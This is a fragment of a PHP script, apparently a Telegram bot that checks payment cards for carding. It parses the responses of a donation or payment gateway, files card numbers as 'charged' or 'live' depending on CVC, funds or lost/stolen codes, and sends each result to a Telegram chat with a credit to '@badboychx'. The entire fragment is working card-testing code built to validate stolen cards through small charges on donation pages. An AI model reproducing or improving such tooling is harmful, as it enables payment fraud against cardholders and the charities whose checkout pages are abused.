//====================[CHK]===[Responses]==============================//

if ((strpos($result3, 'donation-confirmation')) || (strpos($result3, 'Your card zip code is incorrect.')) || (strpos($result3, 'The zip code you supplied failed validation.'))){
file_put_contents('charged.txt', $lista . PHP_EOL, FILE_APPEND);
sendMessage($chatId, '<b>[✅ APPROVED] CCN CHARGED</b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- THANK YOU,] [C-B:- @'.$username.'] [M-B:- @badboychx]</b>');
}

elseif ((strpos($result3, '"cvc_check":"pass"')) || (strpos($result3, "Thank You.")) || (strpos($result3, '"status": "succeeded"')) || (strpos($result3, "Thank You For Donation.")) || (strpos($result3, "Your payment has already been processed")) || (strpos($result3, "Success ")) || (strpos($result3, '"type":"one-time"')) || (strpos($result3, "/donations/thank_you?donation_number="))){
file_put_contents('live.txt', $lista . PHP_EOL, FILE_APPEND);
sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- CVV PASS] [C-B:- @'.$username.'] [M-B:- @badboychx]</b>');
}

elseif ((strpos($result3, 'Your card has insufficient funds.')) || (strpos($result3, 'insufficient_funds'))){
file_put_contents('live.txt', $lista . PHP_EOL, FILE_APPEND);
sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Insufficient Funds.] [C-B:- @'.$username.'] [M-B:- @badboychx]</b>');
}

elseif ((strpos($result3, 'requires an authorization.')) || (strpos($result3, 'VBV Card'))){
file_put_contents('live.txt', $lista . PHP_EOL, FILE_APPEND);
sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Insufficient Funds.] [C-B:- @'.$username.'] [M-B:- @badboychx]</b>');
}

elseif ((strpos($result3, "Your card's security code is incorrect.")) || (strpos($result3, "incorrect_cvc")) || (strpos($result3, "The card's security code is incorrect."))){
file_put_contents('live.txt', $lista . PHP_EOL, FILE_APPEND);
sendMessage($chatId, '<b>[✅ APPROVED] CCN </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R-incorrect_cvc] [C-B:- @'.$username.'][M-B:- @badboychx]</b>');
}

elseif ((strpos($result3, "Your card does not support this type of purchase.")) || (strpos($result3, "transaction_not_allowed"))){
file_put_contents('live.txt', $lista . PHP_EOL, FILE_APPEND);
sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Card Doesnt Support This Purchase.] [C-B:- @'.$username.'] [M-B:- @badboychx]</b>');
}

elseif ((strpos($result3, "pickup_card")) || (strpos($result3, "lost_card")) || (strpos($result3, "stolen_card"))){
file_put_contents('live.txt', $lista . PHP_EOL, FILE_APPEND);
sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Pickup/Lost/Stolen.] [C-B:- @'.$username.'] [M-B:- @badboychx]</b>');
}
else{
sendMessage($chatId, '<b></b>['.$ip.'] '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- '.$msg.'] [C-B:- @'.$username.'] [M-B:- @badboychx]</b>');
}



}

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

?>